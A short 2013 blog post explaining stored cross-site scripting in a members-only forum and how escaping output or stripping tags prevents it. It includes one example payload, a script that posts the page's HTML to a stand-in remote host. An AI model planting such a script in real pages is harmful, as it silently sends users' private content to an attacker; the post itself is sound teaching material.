---
layout: post
title: "Javascript injection attack - what is it and how to prevent"
date: 2013-06-15 20:46
comments: true
categories: [javascript, security, injection attack]
---
Yes we've heard of the term "Javascript injection" from time to time but have you ever wonder how it actually works? In this post I will use a very simple example to demostrate how a potential attacker can take advantage of this kind of vulnerability.

Let's say we build a user forum which only registered user can view its content. One of the basic feature of a forum is to allow user to create new topics or reply to existing topics. In either case we need to create some html form to accept user inputs. We are very aware of MySQL injection so we use prepared statement to store topic content into the database. All is well but we

* forgot to sanitize the topic body (and/or other related fields such as subject) before storing to database
* render content from database as is without using proper escaping. So if an attacker enters the following content into the topic body:


```html
Hello there.
<script type="text/javascript">
	var _info=$('body').html();
	$.post('http://some.remote.host/',{data:_info});
</script>

```
When the topic gets rendered in a normal user's browser, user will see "Hello there" in the topic content. Under the hood the page's html source code (which might contains some information only the user should  have access to) will be sent to a remote host that the attacker has access to without user's awareness as the js code is not rendered (but it does get executed in user's browser). If $('body') contains too much info, the attacker can choose to steal information specific element (or elements).

To prevent this kind of attack, we need to either:
Properly escape content from the server when rendering in the browser.
or
Strip tags such as `<script>`, or only allow tags such as p, br when storing user input into database.
